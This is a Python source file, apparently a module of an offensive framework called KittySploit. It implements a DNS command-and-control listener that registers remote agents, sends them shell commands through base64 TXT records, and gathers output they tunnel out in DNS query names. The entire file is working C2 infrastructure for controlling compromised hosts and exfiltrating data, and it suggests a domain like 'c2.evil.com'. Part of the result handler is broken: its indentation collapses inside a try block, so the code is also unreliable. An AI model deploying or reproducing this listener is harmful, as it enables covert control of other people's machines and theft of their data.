#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
DNS C2 Listener - Listens on UDP for DNS queries on a subdomain and creates sessions.
Agent sends: poll.<client_id>.<domain> to get commands, result.<b64data>.<client_id>.<domain> to send output.
Server responds with TXT record: next command (base64) or "wait".
"""

from kittysploit import *
import threading
import time
import base64
import socket

class Module(Listener):
    """DNS C2 Listener - receives DNS queries on a subdomain, creates sessions, responds with commands via TXT."""

    __info__ = {
        'name': 'DNS C2 Listener',
        'description': 'Listens for DNS queries on a subdomain (C2 channel). Agent polls for commands, sends results in query names. Responds with TXT.',
        'author': 'KittySploit Team',
        'version': '1.0.0',
        'handler': Handler.REVERSE,
        'session_type': SessionType.DNS,
        'references': [
            'https://en.wikipedia.org/wiki/DNS_tunneling',
        ],
        'dependencies': ['dnslib'],
    }

    lhost = OptString("0.0.0.0", "Listen address for DNS server", True)
    lport = OptPort(53, "Listen port (53 requires root/admin)", True)
    domain = OptString("c2.local", "Subdomain zone for C2 (e.g. c2.evil.com - agent uses *.domain)", True)

    def __init__(self, framework=None):
        super().__init__(framework)
        self.running = False
        self.listener_thread = None
        self.sock = None
        self._domain_lower = ""
        self._pending_commands = {}   # session_id -> list of commands (queue)
        self._received_output = {}   # session_id -> list of output strings
        self._client_id_to_session = {}  # client_id (str) -> session_id
        self._session_to_client_id = {}  # session_id -> client_id

    def _check_dependencies(self):
        try:
            import dnslib
            return True
        except ImportError:
            print_error("dnslib is required but not installed")
            print_info("Install it with: pip install dnslib")
            return False

    def run(self, background=False):
        """Start DNS listener (UDP server)."""
        if not self._check_dependencies():
            return False
        try:
            import dnslib
            from dnslib import DNSRecord, DNSHeader, DNSQuestion, QTYPE, RR, TXT
        except ImportError:
            return False

        host = str(self.lhost).strip() if self.lhost else "0.0.0.0"
        port = int(self.lport) if self.lport else 53
        self._domain_lower = (str(self.domain).strip() or "c2.local").lower().rstrip(".")
        if not self._domain_lower.endswith("."):
            self._domain_lower += "."

        self.running = True
        self.listener_thread = threading.Thread(target=self._dns_loop, daemon=True)
        self.listener_thread.start()
        time.sleep(0.3)

        print_success(f"DNS C2 listener started on {host}:{port} (zone: {self._domain_lower})")
        print_info("Agent must query: poll.<client_id>." + self._domain_lower.rstrip(".") + " and result.<b64>.<client_id>." + self._domain_lower.rstrip("."))
        if background:
            return True
        try:
            while self.running:
                time.sleep(0.2)
        except KeyboardInterrupt:
            self.running = False
        return True

    def _dns_loop(self):
        """UDP receive loop; parse DNS, handle query, send TXT response."""
        try:
            import dnslib
            from dnslib import DNSRecord, DNSHeader, DNSQuestion, QTYPE, RR, TXT
        except ImportError:
            return
        host = str(self.lhost).strip() if self.lhost else "0.0.0.0"
        port = int(self.lport) if self.lport else 53
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.sock.bind((host, port))
        except OSError as e:
            print_error(f"Cannot bind {host}:{port} - {e}")
            if port == 53:
                print_info("Use port 5353 for non-root, or run as root for port 53")
            self.running = False
            return
        while self.running:
            try:
                self.sock.settimeout(1.0)
                data, addr = self.sock.recvfrom(1024)
            except socket.timeout:
                continue
            except Exception:
                if self.running:
                    continue
                break
            if not data:
                continue
            try:
                request = DNSRecord.parse(data)
                qname = str(request.q.qname).lower().rstrip(".")
                if not qname.endswith(self._domain_lower.rstrip(".")):
                    continue
                labels = qname.replace(self._domain_lower.rstrip("."), "").rstrip(".").split(".")
                labels = [l for l in labels if l]
                if len(labels) < 2:
                    continue
                qtype = request.q.qtype
                # Format: type.client_id.domain or type.b64chunk.client_id.domain
                msg_type = labels[0].lower()
                if msg_type in ("poll", "register"):
                    client_id = labels[1] if len(labels) > 1 else ""
                    if not client_id:
                        continue
                    session_id = self._client_id_to_session.get(client_id)
                    if session_id is None:
                        session_id = self._create_dns_session(client_id, addr[0])
                        if session_id:
                            self._client_id_to_session[client_id] = session_id
                            self._session_to_client_id[session_id] = client_id
                    if session_id:
                        cmd = self._get_next_command(session_id)
                        reply_data = base64.b64encode(cmd.encode("utf-8", errors="replace")).decode("ascii") if cmd else "wait"
                        if len(reply_data) > 255:
                            reply_data = reply_data[:255]
                    else:
                        reply_data = "wait"
                    reply = request.reply()
                    reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT(reply_data), ttl=60))
                    self.sock.sendto(reply.pack(), addr)
                elif msg_type == "result":
                    if len(labels) < 3:
                        continue
                    b64chunk = labels[1]
                    client_id = labels[2]
                    session_id = self._client_id_to_session.get(client_id)
                    if session_id is None:
                        session_id = self._create_dns_session(client_id, addr[0])
                        if session_id:
                            self._client_id_to_session[client_id] = session_id
                            self._session_to_client_id[session_id] = client_id
                    if session_id:
                        try:
                            s = b64chunk.replace("-", "+").replace("_", "/")
pad = 4 - len(s) % 4
if pad and pad != 4:
    s += "=" * pad
chunk = base64.b64decode(s).decode("utf-8", errors="replace")
                            self._append_output(session_id, chunk)
                        except Exception:
                            pass
                    reply = request.reply()
                    reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT("ok"), ttl=60))
                    self.sock.sendto(reply.pack(), addr)
            except Exception as e:
                if self.running:
                    pass
        try:
            if self.sock:
                self.sock.close()
        except Exception:
            pass
        self.sock = None

    def _create_dns_session(self, client_id: str, client_ip: str):
        """Create a new session for a DNS agent."""
        try:
            session_data = {
                'session_type': 'dns',
                'domain': self._domain_lower.rstrip("."),
                'client_id': client_id,
                'client_ip': client_ip,
                'protocol': 'dns',
                'listener_type': self.name.lower().replace(' ', '_'),
                'handler': 'reverse',
            }
            session_id = self._create_session('reverse', client_ip, 0, session_data)
            if session_id:
                self._pending_commands[session_id] = []
                self._received_output[session_id] = []
                print_success(f"New DNS agent: {client_id} ({client_ip}) -> session {session_id}")
            return session_id
        except Exception as e:
            print_error(f"Error creating DNS session: {e}")
            return None

    def _get_next_command(self, session_id: str) -> str:
        """Pop and return next pending command for session."""
        queue = self._pending_commands.get(session_id, [])
        if not queue:
            return ""
        return queue.pop(0)

    def set_pending_command(self, session_id: str, cmd: str):
        """Queue a command for the agent (called by DNS shell)."""
        if session_id not in self._pending_commands:
            self._pending_commands[session_id] = []
        self._pending_commands[session_id].append(cmd)

    def _append_output(self, session_id: str, text: str):
        """Append agent output (called when result query received)."""
        if session_id not in self._received_output:
            self._received_output[session_id] = []
        self._received_output[session_id].append(text)
        if len(self._received_output[session_id]) > 500:
            self._received_output[session_id] = self._received_output[session_id][-500:]

    def get_output(self, session_id: str, clear=False) -> str:
        """Get concatenated output for session (called by DNS shell)."""
        lines = self._received_output.get(session_id, [])
        out = "\n".join(lines)
        if clear:
            self._received_output[session_id] = []
        return out

    def get_output_lines(self, session_id: str, last_n=50) -> list:
        """Get last N output lines."""
        lines = self._received_output.get(session_id, [])
        return lines[-last_n:] if lines else []

    def shutdown(self):
        """Stop DNS listener."""
        self.running = False
        if self.sock:
            try:
                self.sock.close()
            except Exception:
                pass
            self.sock = None
        if self.listener_thread and self.listener_thread.is_alive():
            self.listener_thread.join(timeout=2)
        print_info("DNS C2 listener stopped")
